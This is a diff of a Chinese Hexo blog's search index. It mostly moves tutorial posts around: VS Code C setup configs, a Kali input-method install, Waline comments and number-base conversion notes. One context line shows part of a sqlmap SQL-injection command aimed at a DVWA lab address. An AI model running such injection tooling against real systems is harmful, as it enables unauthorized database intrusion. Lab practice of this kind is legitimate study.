+                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                   
+                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">false</span>  
+                  <span class="token punctuation">&#125;</span>        
+               <span class="token punctuation">]</span>     
+            <span class="token punctuation">&#125;</span>  
+         <span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104033.png" alt="21" loading="lazy"></p>
+<p>tasks.json</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
+     <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>   
+     <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 注意对应  </span>
+     <span class="token property">"args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span><span class="token string">"-o"</span><span class="token punctuation">,</span><span class="token string">"$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment">// 编译命令参数</span>
+     <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>       
+         <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>
+         <span class="token property">"fileLocation"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"relative"</span><span class="token punctuation">,</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        
+         <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+         <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>
+         <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>         
+         <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>         
+         <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>           
+         <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>            
+         <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>       
+         <span class="token punctuation">&#125;</span>  
+      <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">&#125;</span></code></pre>
+
+
+
+
+
+
+
+<h2 id="重启与调试"><a href="#重启与调试" class="headerlink" title="重启与调试"></a>重启与调试</h2><p>重启vscode，在文件夹C–上新建一个以.c结尾的文件<br>这里我们简单编写一个C语言的程序，设置断点并调试</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104037.png" alt="22" loading="lazy"></p>
+<p>完成</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VLAN原理及VLAN间通信</title>
     <url>/posts/ad13b3a0/</url>
     <content><![CDATA[<div class="danger">
@@ -5217,174 +5385,6 @@ VLAN Name 		Status 		Ports
       </categories>
       <tags>
         <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VS Code C语言开发环境配置</title>
-    <url>/posts/bfe43f2e/</url>
-    <content><![CDATA[<h2 id="安装VS-code"><a href="#安装VS-code" class="headerlink" title="安装VS code"></a>安装VS code</h2><p>VS code：<a href="https://code.visualstudio.com/">https://code.visualstudio.com</a></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103908.png" alt="1" loading="lazy"></p>
-<p>下载完成后双击安装</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103906.png" alt="2" loading="lazy"></p>
-<p>安装完成后，打开VS Code，在安装插件栏搜索chinese，找到简体中文版本，点击install，安装结束后重启应用完成汉化</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103914.png" alt="3" loading="lazy"></p>
-<h2 id="安装用于C-x2F-C-的插件"><a href="#安装用于C-x2F-C-的插件" class="headerlink" title="安装用于C&#x2F;C++的插件"></a>安装用于C&#x2F;C++的插件</h2><p>插件栏搜索Code Runner，点击安装</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103918.png" alt="4" loading="lazy"></p>
-<p>安装完成后在扩展设置中勾选<code>Ignore Selection</code>、<code>Run In Terminal</code></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103923.png" alt="5" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103926.png" alt="6" loading="lazy"></p>
-<p>插件栏搜索C&#x2F;C++,点击安装</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103930.png" alt="7" loading="lazy"></p>
-<h2 id="安装编译器MinGW-W64-GCC"><a href="#安装编译器MinGW-W64-GCC" class="headerlink" title="安装编译器MinGW-W64 GCC"></a>安装编译器MinGW-W64 GCC</h2><p>MinGW-W64 GCC：<a href="https://sourceforge.net/projects/mingw-w64">https://sourceforge.net/projects/mingw-w64</a></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103935.png" alt="8" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103938.png" alt="9" loading="lazy"></p>
-<p>下载完成后解压文件</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103941.png" alt="10" loading="lazy"></p>
-<p>在D盘新建文件夹（英文命名就行，中文总会有莫名其妙的问题），之后将解压的文件移动到刚刚新建的文件夹中</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103947.png" alt="11" loading="lazy"></p>
-<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>打开mingw64，点开bin，将bin所在地址复制下来</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103951.png" alt="12" loading="lazy"></p>
-<p>打开设置，依次点击<code>系统</code>–<code>关于</code>–<code>高级系统设置</code>–<code>环境变量</code> 在<code>Administrator的用户变量</code>中编辑<code>Path</code>变量，点击空白处，将复制好的地址粘贴进去，点击确定</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103955.png" alt="13" loading="lazy"></p>
-<p>同样的步骤，在文件夹中找到inlude，点开，复制地址，粘贴到Path中</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701103959.png" alt="14" loading="lazy"></p>
-<p>依次点击确定关闭窗口</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104003.png" alt="15" loading="lazy"></p>
-<p>完成后按下win+r，输入cmd，点击确定</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104008.png" alt="16" loading="lazy"></p>
-<p>弹出黑框后输入</p>
-<pre class="language-none"><code class="language-none">gcc -v -E -x c++ -</code></pre>
-
-
-<p>若显示结果如图 则配置成功</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104013.png" alt="17" loading="lazy"></p>
-<h2 id="配置三个文件-c-cpp-propertise-json、launch-json、tasks-json"><a href="#配置三个文件-c-cpp-propertise-json、launch-json、tasks-json" class="headerlink" title="配置三个文件 c_cpp_propertise.json、launch.json、tasks.json"></a>配置三个文件 c_cpp_propertise.json、launch.json、tasks.json</h2><p>先在电脑上新建一个文件夹（像我就是在我的电脑上新建一个叫<code>C--</code>的文件夹），打开它</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104018.png" alt="18" loading="lazy"></p>
-<p>之后新建三个文件，名字是<code>c_cpp_propertise.json</code>、 <code>launch.json</code>、 <code>tasks.json</code>，如图</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104021.png" alt="19" loading="lazy"></p>
-<p>接下来把相应内容写进去</p>
-<p>c_cpp_propertise.json</p>
-<blockquote>
-<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
-</blockquote>
-<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
-    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>       
-     <span class="token punctuation">&#123;</span>          
-         <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Win32"</span><span class="token punctuation">,</span>       
-         <span class="token property">"includePath"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
-         <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>               
-         <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>               
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
-         <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
-    <span class="token punctuation">]</span><span class="token punctuation">,</span>      
-    <span class="token property">"defines"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
-        <span class="token string">"_DEBUG"</span><span class="token punctuation">,</span>               
-        <span class="token string">"UNICODE"</span><span class="token punctuation">,</span>
-        <span class="token string">"__GNUC__=6"</span><span class="token punctuation">,</span>               
-        <span class="token string">"__cdecl=__attribute__((__cdecl__))"</span>            
-        <span class="token punctuation">]</span><span class="token punctuation">,</span>           
-    <span class="token property">"intelliSenseMode"</span><span class="token operator">:</span> <span class="token string">"msvc-x64"</span><span class="token punctuation">,</span>
-    <span class="token property">"browse"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              
-        <span class="token property">"limitSymbolsToIncludedHeaders"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
-        <span class="token property">"databaseFilename"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
-        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                   
-            <span class="token string">"$&#123;workspaceRoot&#125;"</span><span class="token punctuation">,</span>                   
-            <span class="token string">"D:/C/mingw64/include/**"</span><span class="token punctuation">,</span>                   
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++"</span><span class="token punctuation">,</span>
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32"</span><span class="token punctuation">,</span>
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward"</span><span class="token punctuation">,</span>
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include"</span><span class="token punctuation">,</span>
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed"</span><span class="token punctuation">,</span>
-            <span class="token string">"D:/C/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/include"</span>
-           <span class="token punctuation">]</span>        
-        <span class="token punctuation">&#125;</span>       
-     <span class="token punctuation">&#125;</span>   
-  <span class="token punctuation">]</span><span class="token punctuation">,</span>   
-   <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">4</span>
-<span class="token punctuation">&#125;</span></code></pre>
-
-
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104027.png" alt="20" loading="lazy"></p>
-<p>launch.json</p>
-<blockquote>
-<p>在这个代码中，我们需要把地址改成自己的mingw 64 bin的地址</p>
-</blockquote>
-<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  
-    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>
-    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
-        <span class="token punctuation">&#123;</span>           
-            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"(gdb) Launch"</span><span class="token punctuation">,</span> <span class="token comment">// 配置名称，将会在启动配置的下拉菜单中显示            </span>
-            <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"cppdbg"</span><span class="token punctuation">,</span> <span class="token comment">// 配置类型，这里只能为cppdbg           </span>
-            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span> <span class="token comment">//请求配置类型，可以为launch（启动）或attach（附加）          </span>
-            <span class="token property">"program"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">,</span> <span class="token comment">// 将要进行调试的程序的路径</span>
-            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 程序调试时传递给程序的命令行参数，一般设为空即可            </span>
-            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment">// 设为true时程序将暂停在程序入口处，一般设置为false            </span>
-            <span class="token property">"cwd"</span><span class="token operator">:</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span> <span class="token comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录workspaceRoot已被弃用，现改为workspaceFolder            </span>
-            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  
-            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台           </span>
-            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            
-            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span><span class="token string">"D:/C/mingw64/bin/gdb.exe"</span><span class="token punctuation">,</span> <span class="token comment">// miDebugger的路径，注意这里要与MinGw的路径对应  </span>
-            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc      </span>
-            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>     
-                <span class="token punctuation">&#123;</span>                   
-                    <span class="token property">"description"</span><span class="token operator">:</span>     <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                   
-                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                   
-                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">false</span>  
-                  <span class="token punctuation">&#125;</span>        
-               <span class="token punctuation">]</span>     
-            <span class="token punctuation">&#125;</span>  
-         <span class="token punctuation">]</span>
-      <span class="token punctuation">&#125;</span></code></pre>
-
-
-
-
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104033.png" alt="21" loading="lazy"></p>
-<p>tasks.json</p>
-<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>   
-     <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>   
-     <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"gcc"</span><span class="token punctuation">,</span> <span class="token comment">// 注意对应  </span>
-     <span class="token property">"args"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span><span class="token string">"-o"</span><span class="token punctuation">,</span><span class="token string">"$&#123;fileBasenameNoExtension&#125;.exe"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment">// 编译命令参数</span>
-     <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>       
-         <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>
-         <span class="token property">"fileLocation"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"relative"</span><span class="token punctuation">,</span><span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        
-         <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
-         <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>
-         <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>         
-         <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>         
-         <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>           
-         <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>            
-         <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>       
-         <span class="token punctuation">&#125;</span>  
-      <span class="token punctuation">&#125;</span>
-   <span class="token punctuation">&#125;</span></code></pre>
-
-
-
-
-
-
-
-<h2 id="重启与调试"><a href="#重启与调试" class="headerlink" title="重启与调试"></a>重启与调试</h2><p>重启vscode，在文件夹C–上新建一个以.c结尾的文件<br>这里我们简单编写一个C语言的程序，设置断点并调试</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220701104037.png" alt="22" loading="lazy"></p>
-<p>完成</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C语言</tag>
       </tags>
   </entry>
   <entry>
@@ -6675,6 +6675,32 @@ sqlmap -u &quot;192.168.224.135&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#
 ]]></content>
   </entry>
   <entry>
+    <title>kali-Linux安装搜狗输入法</title>
+    <url>/posts/89dea71d/</url>
+    <content><![CDATA[<ol>
+<li><pre><code>更改镜像源为国内的镜像源（如果已切换则忽略此步骤）
+</code></pre>
+</li>
+<li><p>打开搜狗输入法官网下载Linux版安装包</p>
+</li>
+</ol>
+<p>​	官网<a href="https://pinyin.sogou.com/">搜狗输入法 </a></p>
+<ol start="3">
+<li>打开终端，进入root模式，输入<code> dpkg -i  *.deb</code>完成安装</li>
+</ol>
+<p>注：</p>
+<p>如果安装过程中提示缺少相关依赖，则执行如下命令解决：</p>
+<p><code>sudo apt -f install</code></p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo博客上使用waline评论系统</title>
     <url>/posts/5b3b1c7f/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Waline 是一款从 <a href="https://valine.js.org/">Valine</a> 衍生的带后端评论系统。部署简单使用方面，干净整洁，可匿名评论。</p>
@@ -6745,32 +6771,6 @@ SITE_URL: 网站地址，用于在消息中显示。</code></pre>
       </categories>
       <tags>
         <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali-Linux安装搜狗输入法</title>
-    <url>/posts/89dea71d/</url>
-    <content><![CDATA[<ol>
-<li><pre><code>更改镜像源为国内的镜像源（如果已切换则忽略此步骤）
-</code></pre>
-</li>
-<li><p>打开搜狗输入法官网下载Linux版安装包</p>
-</li>
-</ol>
-<p>​	官网<a href="https://pinyin.sogou.com/">搜狗输入法 </a></p>
-<ol start="3">
-<li>打开终端，进入root模式，输入<code> dpkg -i  *.deb</code>完成安装</li>
-</ol>
-<p>注：</p>
-<p>如果安装过程中提示缺少相关依赖，则执行如下命令解决：</p>
-<p><code>sudo apt -f install</code></p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -7092,7 +7092,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-ozodidov" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-nznbfImD" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -8165,6 +8165,46 @@ graph TD;
 <p>顺序执行：一条指令执行完了在执行吓一条指令</p>
 <p>并行执行：同时执行两条或多条指令</p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>微机原理</category>
+      </categories>
+      <tags>
+        <tag>微机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微机原理基础二</title>
+    <url>/posts/ac776871/</url>
+    <content><![CDATA[<h2 id="计算机中的编码，数制及转换"><a href="#计算机中的编码，数制及转换" class="headerlink" title="计算机中的编码，数制及转换"></a>计算机中的编码，数制及转换</h2><h3 id="常用进制"><a href="#常用进制" class="headerlink" title="常用进制"></a>常用进制</h3><p>二进制、八进制、十进制、十六进制</p>
+<h4 id="十进制"><a href="#十进制" class="headerlink" title="十进制"></a>十进制</h4><p>数码：0；1；2；3；4；5；6；7；8；9</p>
+<p>进位规则：逢十进一</p>
+<p>表示字母：D（可省略）</p>
+<p>示例：101D；123</p>
+<h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>数码：0；1</p>
+<p>进位规则：逢二进一</p>
+<p>表示字母：B</p>
+<p>示例：101；10B</p>
+<h4 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h4><p>数码：0；1；2；3；4；5；6；7</p>
+<p>进位规则：逢八进一</p>
+<p>表示字母：O</p>
+<p>示例：101；456O</p>
+<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>数码：0；1；2；3；4；5；6；7；8；9；A;B;C;D;E;F（不区分大小写）</p>
+<p>进位规则：逢十六进一</p>
+<p>表示字母：H</p>
+<p>示例：10119H；0A123H（首位是字母，则开头为零）</p>
+<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><h4 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h4><p>整数部分转换：除以二取余数部分，倒序</p>
+<p>小数部分转换：乘以二取整数部分正序</p>
+<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
+<p>例：10.25D&#x3D;1010.01B；12.8125D&#x3D;1100.1101B</p>
+<h4 id="十进制转八进制"><a href="#十进制转八进制" class="headerlink" title="十进制转八进制"></a>十进制转八进制</h4><p>整数部分转换：除以八取余数部分，倒序</p>
+<p>小数部分转换：乘以八取整数部分正序</p>
+<p>例：126.64D&#x3D;176.507O</p>
+<h4 id="十进制转十六进制"><a href="#十进制转十六进制" class="headerlink" title="十进制转十六进制"></a>十进制转十六进制</h4><p>整数部分转换：除以十六取余数部分，倒序</p>
+<p>小数部分转换：乘以十六取整数部分正序</p>
+<p>注：乘到小数位为零，若一直不为零，虚截取一定位数（三至四位）即可</p>
+<p>例：126.64D&#x3D;7E.A3D</p>
 ]]></content>
       <categories>
         <category>学习</category>
